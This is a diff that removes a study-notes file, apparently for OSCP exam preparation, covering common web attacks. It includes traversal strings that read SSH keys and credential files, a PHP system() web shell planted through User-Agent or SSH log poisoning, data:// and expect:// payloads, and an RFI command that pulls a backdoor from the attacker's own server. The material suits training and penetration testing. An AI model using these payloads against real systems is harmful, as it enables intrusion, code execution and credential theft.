@ -1,233 +0,0 @@
# Module 9 Common Web Application Attacks

---
## 9.1 Directory Travel

```bash
#Use it whenever there is a .php at the end of the url or known dir traversal vuln
../../../../../../your/wanted/path

#Use this when the 1st method is not working '%2e' is encoded '.'
%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/your/wanted/path

#Double encoded-variants for stricter filters (%252e)
%252e%252e/%252e%252e/%252e%252e/%252e%252e/your/wanted/path

#Example
http://192.168.247.16/meteor/index.php?page=admin.php?../../../../../../../../../../../../home/offsec/.ssh/id_rsa


```

---
### Important Directories (Windows)


```bash
C:\Users\<username>\Desktop

C:\Users\<username>\Documents

C:\Users\<username>\.ssh\id_rsa

C:\Users\<username>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt  # PowerShell history

C:\Windows\System32\drivers\etc\hosts

C:\Windows\System32\config\SAM  # Password hashes (needs SYSTEM)

C:\Windows\System32\config\SYSTEM

C:\xampp\htdocs\  # Web app files

C:\Inetpub\wwwroot\  # IIS web root

C:\Program Files\

C:\Program Files (x86)\
```

---


### Important Directories (Linux)

```bash
/etc/passwd             # User accounts and home directories

/etc/shadow             # Hashed passwords (needs root)

/etc/hosts              # Internal hostnames and IPs

/etc/ssh/sshd_config    # SSH config — shows allowed users, port

/home/user/.ssh/id_rsa  # Private SSH keys

/var/log/apache2/access.log  # Web server logs — useful for log poisoning

/var/www/html/config.php     # Web app config — often has DB credentials

/proc/self/environ      # Environment variables — may contain secrets

/.env                   # App environment file — API keys, passwords
```

---

### Curl path as is

The curl --path-as-is option tells curl to bypass URL path normalization and transmit dot-dot (/../) or dot (/./) sequences directly to the server exactly as written

---


## 9.2.1 Local File inclusion (LFI)

Directory traversal > read
LFI > write (execute remote files, obtaining RCE)

Use revshells.com to create reverse shell payload

```bash
#Web shell payload, to insert at User-Agent:
User-Agent: <?php echo system($_GET['cmd']); ?>
```

Reverse shell — direct, no files needed, works when you already have code execution. 

Msfvenom — generates a payload file (exe, dll, php, etc) that you transfer to the target and execute. More powerful but requires getting a file onto the machine first.


**When to inject PHP:**
When you've confirmed LFI. If the server is just doing directory traversal (reading files), injecting PHP does nothing. But if LFI is confirmed — meaning the server *executes* included files — then PHP injection becomes viable.

**Why logs specifically:**

You need to get your PHP code into a file that:
1. You can **write to** indirectly
2. The server will **include and execute** via LFI

Logs are perfect because:
- The server writes your User-Agent to the log automatically — you control that input
- Log files are predictable locations (`/var/log/apache2/access.log`, `C:\xampp\apache\logs\access.log`)
- The server has permission to read its own logs

Other places you can inject PHP if logs aren't available:
- **File upload** — upload a PHP file disguised as an image
- **SSH log** (`/var/log/auth.log`) — inject via SSH username field
- **Email logs** — if the server processes email

The pattern is always: find something **you control that gets written to a file**, then use LFI to execute it.

Does that click now?

---

### Log poisoning 

**The problem:**
LFI lets you include files, but you need PHP code inside a file on the server to get execution. You can't upload files directly.

**The solution:**
Apache automatically logs every request to `access.log`, including the **User-Agent header**. You control what's in the User-Agent.

**The chain:**

1. You send a request with `User-Agent: <?php echo system($_GET['cmd']); ?>`
2. Apache writes to its log: `192.168.45.194 - - "GET /page HTTP/1.1" 200 ... "<?php echo system($_GET['cmd']); ?>"`
3. Your PHP code is now sitting inside `/var/log/apache2/access.log`
4. You use LFI to include the log file: `?page=../../../var/log/apache2/access.log&cmd=id`
5. The server includes the log file, PHP sees your code inside it, and executes it

**Why User-Agent specifically?**
Because it's the easiest header to modify that gets written to the log file. You could also poison other log fields, but User-Agent is the most reliable and commonly demonstrated method.

**Why not just put PHP in the URL parameter?**
The URL parameter value goes through the `page` include function — it would try to load your PHP code as a filename, not execute it. The log file is the middleman that stores your code in a real file that LFI can then include and execute.

---

### SSH poisoning

**Step 1 — Attempt SSH login with PHP as the username:**
```bash
ssh '<?php echo system($_GET["cmd"]); ?>'@<target_ip>
```

The login will fail — that's fine. You don't need to get in.

**Step 2 — What happens on the server:**
SSH logs the failed attempt to `/var/log/auth.log`:
```
Failed password for <?php echo system($_GET["cmd"]); ?> from 192.168.45.194 port 22
```

Your PHP code is now sitting inside the auth log file.

**Step 3 — Use LFI to include the log:**
```
?page=../../../var/log/auth.log&cmd=id
```

PHP sees the code inside the log file and executes it. You now have command execution.

**When to use SSH log poisoning over Apache log poisoning:**
- Apache logs are blocked or unreadable by `www-data`
- You already tried Apache logs and got nothing
- Port 22 is open on the target

**Important warnings:**
- Only attempt **one** SSH login with the payload. Every failed attempt adds another copy of your PHP code to the log. Multiple copies can corrupt the log and break execution.
- Use single quotes around the payload in bash so your local shell doesn't interpret the `$_GET` variable
- If you mess up the log with bad syntax, the log file becomes unparseable and this technique is dead for that target

**The key difference from Apache log poisoning:**
With Apache, you poison via User-Agent header in Burp. With SSH, you poison via the username field from your terminal. Different entry point, same result — PHP code in a log file that LFI executes.

---

### Others LFI poisoning

**Mail logs** (`/var/log/mail.log`):
If SMTP is running, send an email with PHP code in the subject or body. The mail server logs it, then include via LFI.

**`/proc/self/environ`:**
This file contains environment variables of the current process, including the User-Agent from the HTTP request. If readable via LFI, your poisoned User-Agent executes directly without needing a separate poisoning step.

> readable meaning having read access

**PHP session files** (`/tmp/sess_<session_id>`):
If you can control any value stored in your PHP session, that value gets written to the session file on disk. Include the session file via LFI to execute it.

**Priority order for OSCP:**
1. Apache access log — most common
2. SSH auth log — good fallback
3. `/proc/self/environ` — quick if readable
4. PHP session files — situational

But remember — before any log poisoning, always try `data://` and `php://` wrappers first. They're simpler and require no poisoning step.

---

### Server (sidenote)
Linux system -> Apache Server
Windows system -> XAMPP (Apache + MySQL + php)


---


## 9.2.2 PHP Wrappers

What they are:

PHP wrappers are built-in PHP protocols that let you access data in different ways beyond just local files. They start with scheme://.


data:// — lets you pass raw data as if it were a file. 
```bash
data://text/plain;base64,<encoded payload in base64>==&cmd=ls"
#encoded payload in base64 = <?php echo system($_GET['cmd']); ?>
```
Instead of including a file, you're passing PHP code directly. No log poisoning needed.


php://filter — lets you read file contents encoded in base64, bypassing certain filters:
```bash
?page=php://filter/convert.base64-encode/resource=/etc/passwd
Useful when the server strips PHP tags but you still want to read files.
```


expect:// — executes commands directly. Rarely enabled but worth trying:
```bash
?page=expect://id
```

> CMD encoded in URL
> Payload encoded in Base64, as mentioned in the line


When to use wrappers vs log poisoning:

- Try data:// first — it's simpler, no setup needed
- If data:// is blocked, fall back to log poisoning
- Use php://filter when you need to read source code of PHP files without executing them


How to identify if wrappers are allowed:

Just try them. If data:// executes your PHP, wrappers are enabled. If not, fall back to log poisoning.

> When using cyberchef, remember to turn off "strip HTML tags"

---

1. Confirm directory traversal — can you read /etc/passwd?
2. Try PHP wrappers first — data:// and php://filter are simpler  and faster than log poisoning
3. If data:// executes code → you have RCE without needing log poisoning at all
4. If wrappers are blocked → then fall back to log poisoning

---

## 9.2.3 Remote File Inclusion (RFI)

RFI vulnerabilities allow us to include files from a remote system over HTTP or SMB.

```bash
#Setting up server, ensure your kali is on the right directory
kali@kali:/usr/share/webshells/php/$
python3 -m http.server 80

#Ensure you have your RCE file
kali@kali:/usr/share/webshells/php/$ cat simple-backdoor.php

#Abusing RFI on target web server
curl "http://mountaindesserts.local/meteor/index.php?page=http://<your.ip>/simple-backdoor.php"
#if your .php file has GET['cmd'], include &cmd at the end
```

---


### Side Notes

URL encoding — needed when passing payloads through a URL (cmd= parameter). Special characters like &, >, spaces break the URL. Always URL encode when going through a web request.
Base64 encoding — needed for PowerShell specifically because:

PowerShell's -enc flag accepts Base64 natively
Avoids issues with quotes and special characters in PowerShell syntax
Bypasses some basic detection

The practical decision tree:
Executing via URL parameter?
└── Yes → URL encode the payload

Payload is PowerShell?
└── Yes → Base64 encode first, then URL encode the whole thing

Simple command like whoami or dir?
└── Just URL encode spaces and special characters
So for a Windows web target with PowerShell — you typically do both:

Base64 encode the PowerShell payload
URL encode the powershell -enc <base64> command before passing via cmd=



**LFI conditions:**
1. A parameter that includes files dynamically (`?page=`, `?file=`, `?template=`)
2. The server **executes** included content, not just displays it
3. The backend language is PHP (most common for LFI)

**How to confirm LFI vs plain directory traversal:**
- Directory traversal: `?page=../../../etc/passwd` → shows file contents as text
- LFI: the same thing works, BUT if you include a file containing PHP code, it **executes** rather than displaying the raw code

**PHP wrapper conditions:**

**`data://`**
- LFI must exist
- `allow_url_include = On` in PHP config (disabled by default)
- Test: `?page=data://text/plain,<?php echo system('id'); ?>`
- If you see `uid=33(www-data)` → it works
- If blank or error → disabled, move on

**`php://filter`**
- LFI must exist
- Works by **default** — no special config needed
- Doesn't give you execution — gives you base64 encoded source code
- Test: `?page=php://filter/convert.base64-encode/resource=index.php`
- Useful for reading PHP source code to find hardcoded credentials

**`expect://`**
- LFI must exist
- Requires `expect` PHP extension installed (very rare)
- Test: `?page=expect://id`
- Almost never works but worth one quick try

**Decision flow:**
```
Found ?page= parameter
  ↓
Try data:// → executes? → RCE
  ↓
No → try php://filter → read source code for credentials
  ↓
No useful creds → log poisoning
```

One sentence: `data://` needs a special config enabled, `php://filter` works almost everywhere but only reads files, log poisoning works when both fail.


---


## Using non-executable Files

Upload your SSH public key and connect to the machine via your private key. If SSH port is open.


---


## 9.4.1 OS command injection

**OS Command Injection** — when a web application passes user input directly into a system shell command without proper sanitization, allowing you to inject and execute your own OS commands.

**Conditions needed:**
1. The app executes system commands on the backend (common in features like ping, DNS lookup, file conversion, archive creation, git operations)
2. User input is included in that command without sanitization
3. You can inject command chaining characters (`;`, `&&`, `|`, `||`)

**How to identify it:**
- Features that feel like they're "doing something" on the server — archiving, converting, checking connectivity
- URL parameters or form fields that take filenames, URLs, IP addresses, or domain names
- Error messages that look like shell output

**Quick test:**
Inject `;id` or `&&whoami` and see if OS command output appears in the response.

**Classic example from your labs:**
The git archive endpoint — it took a URL and passed it to a `git clone` command. Injecting `|whoami` confirmed command injection.

Conditions in one line: **user input + shell execution + no sanitization = command injection**.


---